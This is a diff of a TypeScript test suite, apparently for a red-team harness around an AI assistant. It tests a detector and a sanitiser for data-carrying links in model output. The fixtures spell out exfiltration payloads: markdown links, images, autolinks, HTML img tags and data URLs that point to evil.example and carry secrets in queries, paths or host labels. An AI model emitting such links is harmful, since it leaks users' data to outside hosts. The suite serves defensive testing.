@@ -10,8 +10,16 @@ import {
   type Dataset,
   type RedTeamCase,
 } from "./cases.js";
-import { dataCarryingLinks, neutraliseLinks } from "../../src/domain/exfilLinks.js";
-import { denyAllPolicy, passThroughOutputGuard, runCase, type ResponderFor } from "./harness.js";
+import {
+  dataCarryingLinks,
+  neutraliseLinks,
+} from "../../src/domain/exfilLinks.js";
+import {
+  denyAllPolicy,
+  passThroughOutputGuard,
+  runCase,
+  type ResponderFor,
+} from "./harness.js";
 import {
   capture,
   readRecording,
@@ -214,9 +222,7 @@ describe("negative controls", () => {
       ...clean,
       outputs: [{ phase: 0, text }],
     });
-    const plainLink = withOutput(
-      "[record](/purchasing/purchase-orders/123)",
-    );
+    const plainLink = withOutput("[record](/purchasing/purchase-orders/123)");
     const leakyLink = withOutput(
       `[details](https://evil.example/c?d=${encodeURIComponent(secret)})`,
     );
@@ -231,13 +237,25 @@ describe("negative controls", () => {
   });
 
   it("with the output guard disabled the adversarial links score as exfiltration, with it on they do not", async () => {
-    const cases = (gateSets[3] ?? cuiSet).executable.filter((x) => x.path === "ask");
+    const cases = (gateSets[3] ?? cuiSet).executable.filter(
+      (x) => x.path === "ask",
+    );
     expect(cases.length).toBeGreaterThan(0);
     let unguarded = 0;
     let guarded = 0;
     for (const c of cases) {
-      unguarded += scoreCase("standard", c, await runCase("standard", c, scratchCapture, { outputGuard: passThroughOutputGuard })).exfiltration;
-      guarded += scoreCase("standard", c, await runCase("standard", c, scratchCapture)).exfiltration;
+      unguarded += scoreCase(
+        "standard",
+        c,
+        await runCase("standard", c, scratchCapture, {
+          outputGuard: passThroughOutputGuard,
+        }),
+      ).exfiltration;
+      guarded += scoreCase(
+        "standard",
+        c,
+        await runCase("standard", c, scratchCapture),
+      ).exfiltration;
     }
     expect(unguarded).toBeGreaterThan(0);
     expect(guarded).toBe(0);
@@ -280,25 +298,58 @@ describe("dataCarryingLinks", () => {
     ["a protocol-relative image", "![p](//evil.example/p.png)", []],
     ["a link with a query value", "[x](https://evil.example/c?d=hello)", []],
     ["a link with a fragment value", "[x](https://evil.example/c#hello)", []],
-    ["a long path segment", "[x](https://evil.example/aGVsbG8gd29ybGQgaGVsbG8gd29ybGQ)", []],
+    [
+      "a long path segment",
+      "[x](https://evil.example/aGVsbG8gd29ybGQgaGVsbG8gd29ybGQ)",
+      [],
+    ],
     ["a hex path segment", "[x](https://evil.example/0123456789abcdef)", []],
     ["an autolink with a query", "<https://evil.example/c?d=1>", []],
     ["a bare URL with a query", "see https://evil.example/c?d=1 now", []],
     ["a data URL", "[x](data:text/html;base64,PGgxPg==)", []],
-    ["a number in the host label", "[x](https://4111111111.evil.example/a)", []],
-    ["a hyphenated name in the host label", "[x](https://acme-holdings-4471.evil.example/)", []],
+    [
+      "a number in the host label",
+      "[x](https://4111111111.evil.example/a)",
+      [],
+    ],
+    [
+      "a hyphenated name in the host label",
+      "[x](https://acme-holdings-4471.evil.example/)",
+      [],
+    ],
     ["a short plain absolute link", "[docs](https://docs.example/guide)", []],
-    ["an html img with an absolute src", '<img src="https://evil.example/p.png">', []],
-    ["an html img with a protocol-relative src", '<img src="//evil.example/i?d=SECRET">', []],
-    ["an unquoted protocol-relative href", "<a href=//evil.example/x>go</a>", []],
+    [
+      "an html img with an absolute src",
+      '<img src="https://evil.example/p.png">',
+      [],
+    ],
+    [
+      "an html img with a protocol-relative src",
+      '<img src="//evil.example/i?d=SECRET">',
+      [],
+    ],
+    [
+      "an unquoted protocol-relative href",
+      "<a href=//evil.example/x>go</a>",
+      [],
+    ],
   ])("counts %s", (_name, text) => {
     expect(dataCarryingLinks(text).length).toBeGreaterThan(0);
   });
 
   it.each([
-    ["a relative Depot record link", "[PO 123](/purchasing/purchase-orders/123)"],
-    ["plain text without links", "Your balance is 1,200 USD across three invoices."],
-    ["an html link to a relative path", '<a href="/purchasing/purchase-orders/123">PO</a>'],
+    [
+      "a relative Depot record link",
+      "[PO 123](/purchasing/purchase-orders/123)",
+    ],
+    [
+      "plain text without links",
+      "Your balance is 1,200 USD across three invoices.",
+    ],
+    [
+      "an html link to a relative path",
+      '<a href="/purchasing/purchase-orders/123">PO</a>',
+    ],
   ])("does not count %s", (_name, text) => {
     expect(dataCarryingLinks(text)).toEqual([]);
   });
@@ -306,14 +357,67 @@ describe("dataCarryingLinks", () => {
 
 describe("neutraliseLinks", () => {
   it.each([
-    ["a markdown link keeps its label", "a [label](https://evil.example/c?d=1) b", "a label b", 1],
-    ["a markdown image disappears", "a ![alt](https://evil.example/i.png) b", "a  b", 1],
-    ["an autolink is replaced", "a <https://evil.example/c?d=1> b", "a [link removed] b", 1],
-    ["a bare URL is replaced", "a https://evil.example/c?d=1 b", "a [link removed] b", 1],
-    ["a data URL is replaced", "a <data:text/html;base64,PGgxPg==> b", "a [link removed] b", 1],
-    ["a relative record link is kept", "[PO](/purchasing/purchase-orders/123)", "[PO](/purchasing/purchase-orders/123)", 0],
-    ["an absolute link without data is removed", "[docs](https://docs.example/guide)", "docs", 1],
-    ["a protocol-relative html src is removed", 'x <img src="//evil.example/i?d=1"> y', 'x <img src="[link removed]"> y', 1],
+    [
+      "a markdown link keeps its label",
+      "a [label](https://evil.example/c?d=1) b",
+      "a label b",
+      1,
+    ],
+    [
+      "a markdown image disappears",
+      "a ![alt](https://evil.example/i.png) b",
+      "a  b",
+      1,
+    ],
+    [
+      "an autolink is replaced",
+      "a <https://evil.example/c?d=1> b",
+      "a [link removed] b",
+      1,
+    ],
+    [
+      "a bare URL is replaced",
+      "a https://evil.example/c?d=1 b",
+      "a [link removed] b",
+      1,
+    ],
+    [
+      "a data URL is replaced",
+      "a <data:text/html;base64,PGgxPg==> b",
+      "a [link removed] b",
+      1,
+    ],
+    [
+      "a relative record link is kept",
+      "[PO](/purchasing/purchase-orders/123)",
+      "[PO](/purchasing/purchase-orders/123)",
+      0,
+    ],
+    [
+      "an absolute link without data is removed",
+      "[docs](https://docs.example/guide)",
+      "docs",
+      1,
+    ],
+    [
+      "a protocol-relative html src is removed",
+      'x <img src="//evil.example/i?d=1"> y',
+      'x <img src="[link removed]"> y',
+      1,
+    ],
+    [
+      "a reference-style definition is removed",
+      "![p][1]\n[1]: //evil.example/p.png?d=S",
+      "![p][1]\n[1]: [link removed]",
+      1,
+    ],
+    ["a non-http scheme is removed", "[x](ftp://evil.example/?d=S)", "x", 1],
+    [
+      "a backslash host in html is removed",
+      'x <img src="\\\\evil.example/p.png"> y',
+      'x <img src="[link removed]"> y',
+      1,
+    ],
   ])("%s", (_name, text, expected, removed) => {
     expect(neutraliseLinks(text)).toMatchObject({ text: expected, removed });
   });
